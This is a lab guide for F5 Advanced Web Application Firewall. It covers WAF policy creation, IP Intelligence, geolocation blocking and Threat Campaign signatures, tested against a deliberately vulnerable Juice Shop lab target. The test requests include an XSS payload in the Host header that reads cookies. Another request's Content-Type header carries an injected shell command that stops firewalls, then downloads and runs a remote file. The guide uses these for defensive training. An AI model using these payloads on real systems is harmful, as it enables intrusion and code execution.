# Welcome to the F5 Advanced Web Application Firewall lab guide

This series of lab exercises is intended to explain and demonstrate some key features of F5 Advanced Web Application Firewall. 

The intend is to provide demos on the following content:

[Original Lab Guide](https://rtd-awf.readthedocs.io/en/dev/index.html)

# Table of Contents
# [Getting to Know the Environment](#getting-to-know-the-environment)
  * [Module 1: Lab Topology](#module-1-lab-topology)

# [Class 1 - Getting started with WAF, Bot Detection and Threat Campaigns](#class-1)
  * [Module 1: Transparent WAF Policy](#class-1-module-1)
  * [Module 2: IP Intelligence](#class-1-module-2)
  * [Module 3: Threat Campaigns](#class-1-module-3)

# [Class 2 - Elevated WAF Protection](#class-2)
  * [Module 1: Bot Defense](#class-2-module-1)
  * [Module 2: Behavioral DOS Protection](#class-2-module-2)

# [Class 3 - Advanced Protection](#class-3)
  * [Module 1: Leaked Credential Check - Credential Stuffing](#class-3-module-1)
  * [Module 2: Check how Application Traffic Insights works](#class-3-module-2)
  * [Module 3: Offline Machine Learning](#class-3-module-3)
  * [Module 4: Protecting Credentials with DataSafe](#class-3-module-4)


# Getting to Know the Environment

The F5 Advanced Web Application Firewall Solutions lab is the cornerstone of the Security SME team’s continuing effort to educate F5ers, partners, and customers on ways to efficiently use F5 AWF. This Blueprint is comprised of multiple components including Windows Jumphost, Kali Linux, Docker Enviroment…just to name a few. This blueprint is under content revision in hopes to add additional capabilities for others to either consume existing solutions or to build new solutions that can be shared with the community.

# Module 1 Lab Topology
# Module 1: Lab Topology

In this module, we will talk about the Lab Topology of the “Advanced WAF Demo v16 + LCC, ML and Device ID+” UDF Blueprint.

**Note**

`You´ll find different BIG-IPs inside the Blueprint. To maintain the Blueprint and introduce features which are EA, its easier to approach different BIG-IPs rather then configuring the solutions on one BIG-IP.`


### Lab Topology:

### BIG-IP Component

  * `BIG-IP 17.0`

### On this BIG-IP you can run following Demos:

  * Device ID+
  * IP Intelligence
  * Bot Detection Lab
  * Threat Campaigns
  * Transparent WAF Policy
  * Bot Defense
  * Behavioral DoS
  * Login Page protection


This class will focus on a best practice approach to getting started with F5 WAF and application security. This introductory class will give you guidance on deploying WAF services in a successive fashion. This 141 class focuses entirely on the negative security model aspects of WAF configuration.  
This is the 1st class in a three part lab series (141,241,341) based on: [Succeeding with Application Security](https://support.f5.com/csp/article/K07359270) which closely maps to this visualization of layered Application Security.

![119345353-0da70580-bc99-11eb-94fe-59eabaf3c240](https://user-images.githubusercontent.com/51786870/210393984-04c8c0a8-6f5b-4b95-aa85-9ecab960aa3a.png)


## Lab Environment & Topology

`All work is done from the Windows Client, which can be accessed via RDP (Remote Desktop Client) or SSH. No installation or interaction with your local system is required.`

### Environment
  
Windows Client:  
  
  * BURP Community Edition - Packet Crafting
  * curl - command line webclient. Very useful for debugging and request crafting
  * Postman - API Development and request crafting
  
Linux server:  
  
  * Juice Shop running as a container on "Docker + Hackazon for LCC" virtual machine - deliberately insecure application that allows interested developers just like you to test vulnerabilities commonly found in Java-based applications

### Lab Topology
  
The network topology implemented for this lab is very simple. The following components have been included in your lab environment:

1 x Ubuntu Linux 20.04 client.  
1 x F5 BIG-IP VE (v16.0.1) running Advanced WAF with IP Intelligence & Threat Campaign Subscription Services.  
1 x Ubuntu Linux 20.04 server.  

# It is advised to make a UCS Archive file before modifying the configuration of the BIG-IP


# Class 1
# Class 1 - Getting started with WAF, Bot Detection and Threat Campaigns

# Class 1 Module 1
# Module 1: Transparent WAF Policy
Expected time to complete: 30 minutes

## Exercise 1.1: Transparent Policy
### Objective

  * Create your first WAF Policy
  * Review Learning & Blocking & Policy Building Process settings
  * Implement HTTP Protocol Compliancy checks and test
  * Test with a HTTP Protocol violation plus XSS attack
  * Enable Server Technologies & Attack Signatures
  * Review Reporting
  * Estimated time for completion 30 minutes.

**We will now run the backend app Juice Shop on "Docker + Hackazon for LCC" virtual machine**

# It is advised to make a UCS Archive file before modifying the configuration of the BIG-IP

1. Navigate to the Web Shell of "Docker + Hackazon for LCC" from the browser after logging in to UDF platform

![image](https://user-images.githubusercontent.com/51786870/210506000-696e00a5-7c85-49f3-b991-051697d061bf.png)

2. Run a container with the Juice Shop application with commands below

`docker pull bkimminich/juice-shop`

![image](https://user-images.githubusercontent.com/51786870/210506537-4f12c0be-57f8-4fea-b26c-97283a7dfe0c.png)

`docker run --rm -p 3000:3000 bkimminich/juice-shop`

![image](https://user-images.githubusercontent.com/51786870/210506727-97ed1d9a-c034-47f8-8ade-11386c710f3f.png)


3. Configure a pool **juiceshop_pool** on BIGIP (**https://10.1.1.9**) using that service as a pool member (**10.1.20.5:3000**)

Check the password to the BIGIP from UDF. For security reasons it is not displayed below.

![image](https://user-images.githubusercontent.com/51786870/211490631-ed7fd6d9-fae2-4c1a-9073-6c8a6635e57d.png)


4. Navigate to **Local Traffic > Pools > Pool List** and click **Create**

![image](https://user-images.githubusercontent.com/51786870/210507341-b9e53b9d-052a-4b9a-969d-f9b7f1eeb83a.png)

5. Go to **Local Traffic > Virtual Servers > Virtual Server List** and modify the **destinaion IP address of "vs_Hackazon_II" to 10.1.10.101**

![image](https://user-images.githubusercontent.com/51786870/210507867-6848c58b-33b0-4dd5-83c7-eaf4eac91cbe.png)

7. Go to **Local Traffic > Virtual Servers > Virtual Server List** and click **Create**. Create a virtual server with the settings below 

![image](https://user-images.githubusercontent.com/51786870/210508519-383a893c-0c58-4d9d-af40-b8f4cb6e9b35.png)


![image](https://user-images.githubusercontent.com/51786870/210508408-eacb21f4-8fa8-44ba-9fc4-a2284ef5f16b.png)

![image](https://user-images.githubusercontent.com/51786870/210508814-db77afce-47e5-47ea-a8a5-01721eaacc37.png)


8. Search for Notepad tool, right click on the app and click "Run as administrator"

![image](https://user-images.githubusercontent.com/51786870/210509098-bea6b633-bc85-4d9c-8c19-2301d0a67ec1.png)

9. Open hosts file and add an entry with the value of  juiceshop.f5demo.com and IP address of 10.1.10.58. Do not delete hackazon.f5demo.com. Save the file.

![image](https://user-images.githubusercontent.com/51786870/210509358-9b2087ab-a9f6-438d-8d65-4345191e00fc.png)

![image](https://user-images.githubusercontent.com/51786870/210509454-ac816cc4-7d6f-40af-a8a8-47aa4b395363.png)


10. Check if the service is running

![image](https://user-images.githubusercontent.com/51786870/210509879-63e77c2a-4add-40a9-b1f3-87660de7ddc8.png)

**We will now configure a Layer 7 WAF policy to inspect the X-Forwarded-For HTTP Header.**

### Create your WAF Policy
1. Navigate to **Security > Application Security > Security Policies** and click the Plus (+) button.
2. Name the policy: **juiceshop_policy**
3. Select Policy Template: **Rapid Deployment Policy** (accept the popup)
4. Select Virtual Server: **juiceshop_vs**
5. Logging Profiles: **Log all requests**
6. Notice that the Enforcement Mode is already in **Transparent Mode** and Signature Staging is **Enabled**
7. Click **Save**.

![image](https://user-images.githubusercontent.com/51786870/210510306-5c6177e1-41f0-4b21-850c-4c52360b39e8.png)


### Learning & Blocking
We use Rapid Deployment Policy template to create our policy and we deploy it in manual learning mode. This means as violations and/or false positives occur, the system will make suggestions to modify the policy. The admin will manually evaluate the suggestions and Approve, Ignore or Delete them.

1. Navigate to **Security > Application Security > Policy Building > Traffic Learning** and notice that there are no “learning suggestions” displayed yet. Now it’s time to generate some real legitimate user traffic.
2. In the Chrome browser open a new tab, and go to **http://juiceshop.f5demo.com**. Click on **Account** and then **Login**.

![image](https://user-images.githubusercontent.com/51786870/210511011-e0cbfe72-b2de-41c1-a355-9697036f1f8c.png)


3. Next click on **"Not yet a customer?"** and register new user: "student@f5demo.com" with the password **"student"** and Browse around the site and perform several actions as a real user would.

![image](https://user-images.githubusercontent.com/51786870/210511160-5d940ac8-c19b-47a6-8072-7f4f751d030a.png)

![image](https://user-images.githubusercontent.com/51786870/210511528-5d2b7a89-5109-460a-8598-659d9891ce10.png)

4. Click back on the Advanced WAF GUI tab in your browser and refresh the traffic learning screen. If you navigated away or closed the tab, open a new one, login to Advanced WAF and go to: **Security > Application Security > Policy Building > Traffic Learning**.

5. You will see many Suggestions and a learning score that the system assigns based on how many times it has seen an occurence and from what source. You can **Accept, Delete, Ignore** or **Export** the suggestion.

`This is where it usually starts to get a little dicey for a first-time WAF admin. Always look very carefully at the suggested action before deciding on which action to take. It is also helpful to define a whitelist so that the policy can learn quicker and from known trusted sources. You generally do not want the system learning from random and/or hostile Internet traffic and making suggestions to relax the policy.`
6. Notice that most of the learning suggestions involve enabling various HTTP protocol Compliance Checks.
7. Find and select the suggestion for **Enable HTTP protocol compliance check - HTTP Check: No Host header in HTTP/1.1 request**.

![image](https://user-images.githubusercontent.com/51786870/210512098-9c8236d7-bba6-47db-8840-486883d963cb.png)

8. Review the **Suggested Action** and click **Accept** and **Apply Policy**.

9. What just happened and how do you see what changed by who and when? Audit Log of course!
10. Go to **Security > Application Security > Security Policies > Policies List**, click **juiceshop_policy**, go to **Audit Log** tab and review the most recent actions. You can see who, what and when every component within a policy was modified. (This step is not necessary but meant to draw your attention to the audit log)

![image](https://user-images.githubusercontent.com/51786870/210513154-ea99ad4c-e208-41a3-9946-0dc1d9f7a70e.png)

11. Click on the Element Name (blue hyperlink) **No Host header in HTTP/1.1** request This takes you to the Learning and Blocking Settings screen where the check was enabled.

![image](https://user-images.githubusercontent.com/51786870/210513288-065f6352-598a-40f2-baef-fa9f8bd1a111.png)

12. Notice that by default in the Rapid Deployment Policy, learning is enabled for most of the common HTTP Protocol compliancy checks. Also notice that the **Enable** checkbox next to **No Host header in HTTP/1.1** request is now checked.

13. Uncheck the **Learn box** for this violation then **Save** and **Apply** policy.

![image](https://user-images.githubusercontent.com/51786870/210513440-b6dfe3b0-e7d3-4cde-b2fd-996c732d1346.png)

14. Open a Kali linux Web Shell from the UDF platform, and send the following request. This request is being sent without a host header and should now raise a violation in our Event Log rather than a learning suggestion.

```bash
curl -k -H 'Host:' http://10.1.10.58/
```

![image](https://user-images.githubusercontent.com/51786870/210514606-874dc305-c37d-4c36-8a0e-2a377c6eb06a.png)

15. Review the **Alarmed request in Security > Event Logs > Application > Requests**.

![image](https://user-images.githubusercontent.com/51786870/210514759-14261d2d-7e5b-478a-9a0a-65f6e6d06036.png)

16. To review, you just took a learning suggestion and accepted it to enable a protocol compliancy check and then you disabled future learning suggestions for this event. Violations are now alarmed in the Event Logs.

17. Go back to **Security > Application Security > Policy Building > Traffic Learning** You would now typically go through and enable all of the checks that the policy is recommending regarding http protocol compliance and evasion technique detection.

`Remember that your policy is safely in transparent mode so accepting suggestions and enabling checks will only raise alarms and no blocking actions will occur. This is why it is very important to start off transparently until you fully understand the basics of managing a WAF policy.`

### Policy Building Process

One thing you can do to greatly increase the integrity of the learning suggestions is, define trusted IP’s. You can also tell the system to **Only learn from trusted IP’s** which is a very wise thing to do if you are developing policy on an app that is exposed to untrusted or Internet traffic.

1. Go to **Security > Application Security > Policy Building > Learning and Blocking Settings** and expand the **Policy Building Process** section at the bottom. Here you can see settings that this particular policy is using for learning. Enable "**Advanced**" view. Notice that **Trusted IP Addresses List** is empty.

2. Click the little window/arrow icon next to **Trusted IP Addresses** List is empty.

![image](https://user-images.githubusercontent.com/51786870/210515220-b4ba2d3c-8db0-4a00-963c-c872b1c0b374.png)

3. This takes you to: **Security > Application Security > IP Addresses > IP Address Exceptions**. Click **Create**.

4. For IP Address: **10.0.0.0** and for Netmask: **255.0.0.0**. Check the box for **Policy Builder trusted IP** and click **Add** and **Apply Policy**.

![image](https://user-images.githubusercontent.com/51786870/210515429-3cfcc6ad-14b0-44d1-b7c2-d2db7d9d5821.png)

5. Navigate back to **Security > Application Security > Policy Building > Learning and Blocking Settings** and expand the **Policy Building Process** section. Notice that our newly defined network is now a **Trusted IP**. This will greatly enhance the speed and quality of learning suggestions.
6. Change the view from Basic to Advanced and review all the fine-grained configurations for the **Policy Building Process**.

![image](https://user-images.githubusercontent.com/38420010/119369972-0beb3b00-bcb5-11eb-9cf4-c368a7172654.png)

**You now know how to define a trusted ip and configure the policy building process settings**

### Burp’ing the App

In this section we are going to use the free/community version of an excellent DAST tool; Burp. Unfortunately, the free version does not actually allow DAST but it is still an excellent tool for packet crafting and that’s exactly how we are going to use it.

### Accept the Remaining Learning Suggestions

Go to **Security > Application Security > Policy Building > Traffic Learning** and select all of the remaining suggestions and click **Accept > Accept suggestions** and then **Apply Policy**.

![image](https://user-images.githubusercontent.com/51786870/210516002-469b26b5-1f07-46a6-92ef-8af052c88dea.png)

### HTTP Compliancy Check - Bad Host Header Value

The **Bad Host Header Value** check is an HTTP Parser Attack and definitely something that should be implemented as part of **Good WAF Security**. It was included in the suggestions you just accepted.

**Risk**: If we allow bad host header values they can be used to Fuzz web servers and gather system information. Successful exploitation of this attack could allow for the execution of XSS arbitrary code.

1. Launch **Burp** from the Desktop. **Do Not click multiple times. It takes a few moments to load**.

![image](https://user-images.githubusercontent.com/51786870/210516327-76bfb7ad-7b47-47c2-8c14-f7a7d46b3287.png)

2. **DO NOT update.**
3. Choose **Temporary Project** and click **Next** and then click **Start Burp**.

![image](https://user-images.githubusercontent.com/51786870/210516409-60b4e392-048e-4395-af3f-9adba0e6d361.png)

4. Click the **Repeater** tab and paste in the following http request (Replace the username and password with credentials you have created.) and click **Send**.
5. A popup window will appear to configure the target details. For host use: **10.1.10.58**. For port use: **80**. **Do not check the Use HTTPS box**.
6. Click **Send**
**XSS in HOST Header**  

```
POST https://10.1.10.58/#/login HTTP/1.1
User-Agent: BestBrowser
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Host: <script>alert(document.cookie);</script>

username=student@f5demo.com&password=student
```

![image](https://user-images.githubusercontent.com/51786870/210516998-8b436fc6-da42-4043-8a99-6d5053e8f337.png)

7. Back in Advanced WAF, browse to **Security > Event Logs > Application > Requests** and review the alert for this Severity 5 attack. Note the alert severity is much higher (5) for this attack type due to several violations occuring including HTTP protocol Violations and several XSS signatures.
8. Review all the details and then click the 3 under the **Attack Signature Detected** violation to see all of the staged XSS Attack Signatures that were triggered.

![image](https://user-images.githubusercontent.com/51786870/210517143-d77e7f19-9997-4cd0-b4a9-ce0ce56fb449.png)

![image](https://user-images.githubusercontent.com/51786870/211494066-b9a2acb6-9647-43b8-804d-efb3425abf44.png)


### Server Technologies & Attack Signatures
In this final exercise we will examine server technologies which allow you to automatically discover server-side frameworks, web servers and operating systems. This feature helps when the backend technologies are not well known or communicated from the Dev team.

1. Go to **Security > Application Security > Policy Building > Learning and Blocking Settings > Attack Signatures**
2. Review the Attack Signatures that were applied during policy creation from back in Lab 1. **Generic Detection Signatures (High/Medium Accuracy)**. Notice that they are set to **Learn/Alarm/Block** and **Staging** is enabled.
3. Locate Server Technologies and expand the option. Click **Enable Server Technology Detection**, click **Save** and then click the **New Window Icon** next to Server Technologies.

![image](https://user-images.githubusercontent.com/51786870/210517472-f3b74877-9882-46ff-9a50-d627394e036c.png)

4. Scroll down to Advanced Settings > Server Technologies and click in the box. Search for Linux since we know the server is running Linux. The system will display a box describing which new signature sets will be applied. Click Confirm.

![image](https://user-images.githubusercontent.com/51786870/210517725-420aff8b-5893-4d5f-936a-db18a859ad4b.png)

![image](https://user-images.githubusercontent.com/51786870/210517785-9a193b58-5658-4448-8591-26d4594fa843.png)

6. Make sure to **Save** and **Apply Policy**.
7. Go to **Security > Application Security > Policy Building > Learning and Blocking Settings > Attack Signatures** and notice the new Unix/Linux Server Technology signature sets that were added to the policy.

![image](https://user-images.githubusercontent.com/51786870/210517924-850e02b9-1d07-4d98-a7b1-997e4dfc4362.png)

### Framework Attacks

1. Back in BURP navigate to the repeater tab and adjust the payload to the following and hit Send. Replace password with the password you’ve been using all along

**Framework Attack**
```
POST https://10.1.10.58/#/login HTTP/1.1
User-Agent: BestBrowser
Pragma: no-cache
Cache-Control: no-cache
Content-Type: /etc/init.d/iptables stop; service iptables stop; SuSEfirewall2 stop; reSuSEfirewall2 stop; cd /tmp; wget -c https://10.1.10.145:443/7; chmod 777 7; ./7;
Content-Length: 44
Host: juiceshop.f5demo.com

username=student@f5demo.com&password=student
```

![image](https://user-images.githubusercontent.com/51786870/210518168-1db7f73d-118c-41a2-8d24-9ba6360a80a8.png)


2. Browse to **Security > Event Logs > Application > Requests** and look for the most recent Severity 5 Event. Select the event, review the violations and click the 2 under Occurrences for the Attack signature detected violation.

![image](https://user-images.githubusercontent.com/51786870/210518293-2c1ce688-5905-4d25-b737-7638fdc3f0f4.png)

3. Click the little blue i and review the Attack Signature Details. We can see that this was a Systems based Unix/Linux Signature in staging mode.
![image](https://user-images.githubusercontent.com/51786870/210518444-c44a12c2-b2b2-4078-a887-9d84f13dc9b6.png)

4. We are now alerting on attacks aimed at Server Technologies.

**This completes Module 1**



# Class 1 Module 2
# Module 2: IP Intelligence
Expected time to complete: 30 minutes

We created a transparent policy way back in Lab 1 to configure Transparent WAF Policy. We then tested out standard signatures  and now we will explore and test some of the other components that should be in scope for enforcement early on in your WAF deployment.

### Exercise 1 – Task 1 - Review IP Intelligence Log entries on Advanced WAF
### Objective

  * Configure Global IPI Profile & Logging
  * Review Global IPI Logs
  * Configure Custom Category and add an IP
  * Implement IPI w/ XFF inspection
  * Estimated time for completion: 30 minutes.

An IPI policy can be created and applied globally, at the virtual server (VS) level or within the WAF policy itself.  

![image](https://user-images.githubusercontent.com/38420010/119348500-3e893980-bc9d-11eb-8836-e57471dc73a8.png)

1. RDP to the Windows Client by choosing the RDP access method from your UDF environment page. 

2. Once logged in, launch Chrome Browser. You can double-click the icon or right click and choose execute but do not click multiple times. It does take a few moments for the browser to launch the first time.

3. Open a web session to the BIGIP at https://10.1.1.9 and login to TMUI. It is normal to see a certificate warning that you can safely click through. Or you can use TMUI access via UDF.

4. On the Main tab, click Local Traffic > Virtual Servers and you will see the Virtual Servers that have been pre-configured for your lab. Essentially, these are the listening IP’s that receive requests for your application and proxy the requests to the backend “real” servers.

![image](https://user-images.githubusercontent.com/51786870/211496992-cf9618be-f746-4b41-8c5e-a1fac2cf601b.png)

During tests we will use the VS below:

  * **vs_Hackazon_III** - Main Site - Status of green indicates a healthy backend pool of real servers

5. In Chrome and click on the Add-On called **X-Forwarded-For Header**.

![image](https://user-images.githubusercontent.com/51786870/211503785-6425f625-e286-4ce8-b69c-6ce97fa8ba9d.png)

6. Within here, you have already an IP configured which should trigger a IPI violation in the Event Logs of AWAF.

To ensure the IP is still in bad category test from https://www.brightcloud.com/tools/url-ip-lookup.php

![image](https://user-images.githubusercontent.com/51786870/211503270-6e82857c-f756-49fd-8d7d-77a14c1cfbc3.png)

If that IP has rotated out of the malicious DB, you can try one of these alternates:

   * 82.200.247.241 - Phishing
   * 82.200.247.241 - Phishing
   * 134.119.219.93 - Spam Source
   * 218.17.228.102 - Spam Source

![img_class1_module1_animated_1](https://user-images.githubusercontent.com/51786870/211505104-0a03d2fb-390b-419c-b289-e8eb8fed1737.gif)

7. IP Intelligence is already configured on BIG-IP.

8. Login to BIG-IP via WebUI (The Password of the BIG-IP instance is listed within the Details / Documentation Tab).

9. Navigate to **Security > Event Logs > Application > Requests** and review the entries. You should see a Severity 3 Alert for the attempted access to uri: /xff-test from a malicious IP.

![image](https://user-images.githubusercontent.com/51786870/211505184-a712cf9d-d9da-4db7-bdce-585cf158fbf2.png)

**Demo IP Intelligence - What has been configured**

1. Navigate to Security > Application Security > Policy Building > Learning and Blocking Settings and expand the IP Addresses and Geolocations section.

**Note**

`These are the settings that govern what happens when a violation occurs such as Alarm and Block. We will cover these concepts later in the lab but for now the policy is in blocking but within the IPI configuration is we enabled alarm only.`

2. Navigate to Security › Application Security > Security Policies > Policies List.

3. Select the Security Policy named “Hackazon-WAF-IPI”. Within the “Policy Configuration” choose “IP Intelligence”.

4. Notice at the top right that IPI is “ON” and alarm is configured for each category.

![img_class1_module1_animated_3](https://user-images.githubusercontent.com/51786870/211505383-ae360e0a-9397-4a42-9955-ffd6bb7b6904.gif)

5. For the demo to work, XFF inspection in the WAF policy is enabled via to Security > Application Security > Security Policies > Policies List > Hackazon-WAF-IPI.

![img_class1_module1_animated_4](https://user-images.githubusercontent.com/51786870/211505436-b34012d2-138a-4c7c-8112-62c4a8e471be.gif)

6. Navigate to Local Traffic > Virtual Servers and click on VS named vs_Hackazon_III.

7. You´ll notice withing the Configuration that we used a HTTP Profile (Client) with XFF enabled.

8. Under the Security tab in the top middle of the GUI click on Policies and your policy settings included a Application Security Policy named Hackazon-WAF-IPI and a Log Profile named ASM-BOT-DoS-Log-All.

![img_class1_module1_animated_5](https://user-images.githubusercontent.com/51786870/211505526-7f6725b6-f2c2-47cd-8b97-0bf39ed93a4b.gif)

**Note**

`It is best practice to enable Trust XFF in the policy when configuring IPI via WAF policy. XFF inspection is one of the advantages to consider when deploying IPI and can only be done via WAF policy. Although this setting is not needed to demonstrate this lab, it is strongly recommended to have it enabled. Attackers often use proxies to add in source IP randomness. Headers such as XFF are used to track the original source IP so the packets can be returned. In this example the HTTP request was sent from a malicious IP but through a proxy that was not known to be malicious. The request was picked up at Layer 7 due to the WAF’s capabilities. This demonstrates the importance of implementing security in layers.`

**This concludes IP Intelligence Lab**

### Exercise 1 - Task 2 - Add a Geolocation Policy

Another practical control to implement early on in your WAF deployment is Geolocation blocking or fencing. If we know that our application is only supposed to be accessed from certain countries or not accessed from others, now is the time to get that configured and enforced.

`Much like our Layer 7 IPI Policy, with Advanced WAF the Geolocation logic happens at the policy level. You may have many policies each with their own unique configuration per application or you may use a parent policy that has baseline settings.`

### Geolocation

1. Logon to BIGIP webUI

2. Open **Security  ››  Application Security : Security Policies : Policies List**, edit **Hackazon-WAF-IPI** and under Policy Configuration > General Settings scroll down to Geolocation Enforcement

![image](https://user-images.githubusercontent.com/51786870/211506687-30802c0f-c3db-400f-9353-3f2b791e53b8.png)

3. Select **Kazakhstan** and move it to Disallowed Geolocations. **Save** and then **Apply Policy** and go to **Hackazon - IPI** tab in the browser. The request should be blocked

![image](https://user-images.githubusercontent.com/51786870/211507709-ae19f00e-a891-4aed-8584-d91fceb17611.png)

`N/A covers all RFC1918 private addresses. If you aren’t dropping them at your border router (layer 3), you may decide to geo-enforce at ASM (Layer 7) if no private IP’s will be accessing the site.`

4. Navigate to **Security > Event Logs > Application > Requests** and review the entries in the event log that contain both IPI and Geolocation violations.

![image](https://user-images.githubusercontent.com/51786870/211508141-dcb58470-d9aa-4dd2-8690-ab70942a8bdf.png)

`You can also perform Geolocation Enforcement with LTM policies attached to Virtual Servers even if you are only licensed for Advanced WAF. Blocking decisions made here would not be reflected in the Application Requests WAF Log but can be still be logged.`


**This completes Exercise 1 Task 2**

**Congratulations! You have just completed Lab 1 by implementing an IPI policy globally at Layer 3 and at Layer 7 via WAF policy for a specific application. Next you added Geolocation Enforcement to the policy and learned that this can be done via WAF policy or LTM policy. This follows our best-practice guidance for getting started with Application Security.**



# Class 1 Module 3
# Module 3: Threat Campaigns
Expected time to complete: 10 minutes

## Exercise 3.1: Threat Campaigns

Threat Campaign signatures are subscription based and sourced from a variety of threat intel sources based on real world campaigns to attack and/or take over resources. Attackers are constantly looking for ways to exploit the latest vulnerabilities and/or new ways to exploit old vulnerabilities. F5’s Threat Research team is constantly monitoring malicious activity around the globe and creating signatures specific to these exploits. These Threat Campaign signatures are based on current “in-the-wild” attacks. Threat Campaign signatures contain contextual information about the nature and purpose of the attack.

As an example, a normal WAF signature might tell you that SQL injection was attempted. A Threat Campaign signature will tell you that a known threat actor used a specific exploit of the latest Apache Struts vulnerability (CVE -xxxx) in an attempt to deploy ransomware for cryptomining software.

### Objective

  * Prep the Virtual Server
  * Review TC Signatures
  * Review Learning/Blocking settings and Staging Concept
  * Launch Attack
  * Test and verify logs
  * Estimated time for completion: 20 minutes

### Prep the Virtual Server

These steps are necessary for this demonstration. In the “real world” having the Bot Defense Profile pick up this type of attack coming from a tool, not a browser, would be preferred, going back to the layered security approach.

1. Navigate to **Local Traffic > Virtual Servers > Virtual Server List > juiceshop_vs > Security > Policies**.

2. Check if the **juiceshop_policy** is selected. Threat Campaign Signatures are part of your WAF policy.

3. **Disable all other protections**. We are removing the bot profile since we will be using a "Bot" to test the Threat Campaign signatures.

4. **Enable Log all requests profile** and click **Update**. Your virtual should look like this:

![image](https://user-images.githubusercontent.com/51786870/211510275-149224a2-38a0-4cdf-85fe-dfb6a60e3183.png)

### Review TC Signatures

1. Navigate to **System > Software Management > Live Update > Threat Campaigns**. DO NOT update the system but note the Installation History. You can also view the Bot Signatures and other signature packages that are currently installed or pending.
`Without an Advanced WAF license and Threat Campaign Subscription you will NOT get Live Updates for Bot Signatures.`

![image](https://user-images.githubusercontent.com/51786870/211510625-17aa22a8-c2f4-4709-964b-68b019783369.png)

**Note**

`You can optionally update Threat Campaigns if it is available.`

![image](https://user-images.githubusercontent.com/51786870/211510937-8a54de42-41cb-40f3-93ac-d811035bbfd5.png)

2. Navigate to **Security > Options > Application Security > Threat Campaigns** and review some of the signatures and information about them.

![image](https://user-images.githubusercontent.com/51786870/211511035-7b817586-761e-4d8e-bdb8-aa5df325c7a5.png)

3. Search for the **Apache Struts2 Jakarta Multipart Parser BillGates** signature and note the attack type as well as the CVE reference: **CVE-2017-5638**. You can click the CVE reference link for more information.

![image](https://user-images.githubusercontent.com/51786870/211511319-55963f70-4d66-49c2-bee3-2abff22a8b67.png)

![image](https://user-images.githubusercontent.com/51786870/211511397-d59fedef-9a02-4437-a19a-089980853191.png)

4. Click on the filter button and under the Reference field, type: **2022** and **Apply Filter** to search for all CVE’s related to 2022.

![image](https://user-images.githubusercontent.com/51786870/211511623-3c37c774-dada-451c-8141-d3c763d1a3cf.png)

### Review TC Learning and Blocking Settings

1. Navigate to **Security > Application Security > Policy Building > Learning and Blocking Settings** and expand the **Threat Campaigns** section.

2. Note that the system is set to **Alarm** and **Block** on signature matches. Remember, our policy is in transparent mode so the blocking setting will not have any effect.

![image](https://user-images.githubusercontent.com/51786870/211511765-ffdd10cf-868b-4196-9607-55bcd6666e8f.png)

`Staging and the Enforcement Readiness period means that when new signatures are downloaded, if staging is enabled, the system will wait until the enforement readiness period is over before it starts blocking. You will still see alarms during this period. Due to the high accuracy nature of Threat Campaign signatures, the default system configuration is to have Staging turned off so new signatures go into effect immediately.`

### Test TC Signatures and Review Logs

1. From the Windows Client launch **Postman** from the Desktop. **It takes a few moments for Postman to launch**.

![119361378-e1e14b00-bcab-11eb-9766-16f63afb8f1b](https://user-images.githubusercontent.com/51786870/211512064-c7ac6ffd-79a7-4b30-8dfd-73bc17ae0c5e.png)

2. You will see a collection called **Advanced WAF - ThreatCampaign** and within, an item called **Struts 2 Jakarta - gift**. This simply tests that the site is responding.

![image](https://user-images.githubusercontent.com/51786870/211512276-be916372-51c5-467f-aa85-430b153682b9.png)


3. Click on **Struts 2 Jakarta - gift** and then click the blue **Send** button on the top right. If your output does not look like this, please let a lab instructor know.

![image](https://user-images.githubusercontent.com/51786870/211512682-7e9676a8-7ddd-47c5-a9c3-b08fc327f030.png)

4. Click on the **Struts2 Threat Campaign** attack and then click the blue **Send** button. Explore the http headers and bodies being sent. If your policy was in blocking mode you would receive a block page but since the policy is transparent, these attacks are making it through and the juiceshop page is returned.

![image](https://user-images.githubusercontent.com/51786870/211513054-851c2064-8d20-49c3-8fa6-217c1332338c.png)

5. Back in Advanced WAF, navigate to **Security > Event Logs > Application > Requests** and review the Sev5 events.

![image](https://user-images.githubusercontent.com/51786870/211513207-609ee5ac-2719-40c6-a462-614ef1edc9f8.png)

6. Click on the event for **/index.action** and note the triggered violations. Click on **All Details** to the right of the screen to get more information. You can also click the **Open to new tab** icon in the top right to get an isolated view of this violation.

![119363841-8ebcc780-bcae-11eb-8f2d-fc593edba67f](https://user-images.githubusercontent.com/51786870/211513504-d52c7c97-bab2-4e44-980d-c92dfff0407d.png)

7. When working in the WAF Requests event viewer, you can see exactly which Attack Signatures or Threat Campaigns were triggered under the **Violations** section. Click the **Numerical Value** under **Occurrences** for **Threat Campaign detected**.

![image](https://user-images.githubusercontent.com/51786870/211513767-b1e5abd7-2318-4de0-b430-b7877963d2a7.png)

8. Notice that the there were actually 2 Threat Campaigns Signatures that triggered and you can see the Applied Blocking Setting of **Alarm**

9. Optionally you can retest the traffic from **Postman** with the policy in **Blocking Mode**

**This completes Module 3**

**Congratulations! You just completed Lab 3 and have continued your introductory knowledge to Advanced WAF with Threat Campaign Signatures. These powerful and highly-accurate signatures are a great first step into enforcing blocking as they produce virtually no false positives.**

**This completes Class 1**
  



# Class 2

# Class 2 Module 1
# Module 1: Bot Defense

Expected time to complete: 10 minutes

## Exercise 2.1: Bot Detection Lab

In this Lab we want to get familar with the Bot Detection Capabilities of AWAF. The goal is to create and apply a transparent Bot Defense Profile (signatures only) and enable logging for Bot requests.

**Important**

`To only focus on Bot Defense, we will use the “vs_Hackazon_I” virtual server for this, because there is no WAF policy attached to it. If you wanna use a different VS, please make sure that there is no WAF policy active.`

![image](https://user-images.githubusercontent.com/51786870/211516332-db80f062-7398-48db-b48a-f2f7db2c564b.png)

### Create Logging Profile

**Note**

`The “vs_Hackazon_I” virtual server already has a Logging Profile attached to it, which can be used for this demo. In case there is no Logging Profile attached or you want to create your own profile for this demo, use the steps described below.`

1. Navigate to Security > Event Logs > Logging Profiles and create a new Logging Profile with the settings shown in the screenshot below (local publisher with all options enabled).

2. Give it a name and click create.

![image](https://user-images.githubusercontent.com/51786870/211516680-d49e05fc-64b5-4b5a-beb1-73f82a89a74f.png)

**Create Bot Defense Profile**

**Note**

`The “vs_Hackazon_I” virtual server already has a Bot Defense Profile attached to it, which can be used for this demo. In case there is no profile attached or you want to create your own for this demo, use the steps described below.`

1. Navigate to Security > Bot Defense > Bot Defense Profiles and click Create.

